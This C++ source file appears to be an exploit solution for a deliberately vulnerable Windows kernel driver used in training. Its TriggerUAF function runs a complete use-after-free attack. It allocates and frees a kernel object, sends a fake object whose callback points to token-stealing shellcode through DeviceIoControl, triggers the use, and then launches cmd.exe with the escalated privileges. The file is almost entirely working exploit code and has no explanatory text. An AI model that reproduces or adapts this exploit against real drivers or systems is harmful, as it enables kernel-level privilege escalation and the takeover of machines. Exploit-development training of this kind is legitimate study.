#include <Windows.h>
#include "stdio.h"

#include "Solutions.h"
#include "ioctal_codes.h"
#include "TokenStealingShellcode.h"

enum class Commands {
	AllocateUAFObject,
	FreeUAFObject,
	AllocateFakeObject,
	UseUafObject
};

typedef struct UAFStruct {
	INT callback;
	CHAR buf[0x54];
} UAFStruct;

NTSTATUS Command(HANDLE deviceHandle, Commands operate);
DWORD getIoctl(Commands operate);

DWORD Solutions::TriggerUAF() {
	
	// allocate 
	// free
	// allocate fake object
	// overwrite callback
	// use
	Command(_hDeviceHandle, Commands::AllocateUAFObject);
	Command(_hDeviceHandle, Commands::FreeUAFObject);

	DWORD dwBytesReturned = 0;
	UAFStruct* lpInBuffer = (UAFStruct*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UAFStruct));
	if (!lpInBuffer) {
		wprintf(L"[-] Could not allocate buffer");
		return STATUS_NO_MEMORY;
	}

	lpInBuffer->callback = (ULONG)&tokenStealingShellcodeWriteWhatWhere;
	memset(lpInBuffer->buf, 0x41, 0x54);
	wprintf(L"[+] toekn stealing shellcode 0x%x", (ULONG)&tokenStealingShellcodeWriteWhatWhere);
	
	if (!DeviceIoControl(_hDeviceHandle, IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED,
		(PVOID)lpInBuffer, sizeof(UAFStruct), NULL, NULL, &dwBytesReturned, NULL)) {
		wprintf(L"[-] Could not talk with the driver");
		return 1;
	}
	
	Command(_hDeviceHandle, Commands::UseUafObject);
	
	system("cmd.exe");

	return 0;
}

NTSTATUS Command(HANDLE deviceHandle, Commands operate) {
	
	DWORD dwBytesReturned = 0;
	return
		DeviceIoControl(deviceHandle,
			getIoctl(operate),
			NULL,
			NULL,
			NULL,
			NULL,
			&dwBytesReturned,
			NULL
		);
}

DWORD getIoctl(Commands operate) {
	switch (operate) {
	case Commands::AllocateUAFObject:
		return IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED;
	case Commands::FreeUAFObject:
		return IOCTL_FREE_UAF_NON_PAGED;
	case Commands::UseUafObject:
		return IOCTL_USE_UAF_NON_PAGED;
	}

	return NULL;
}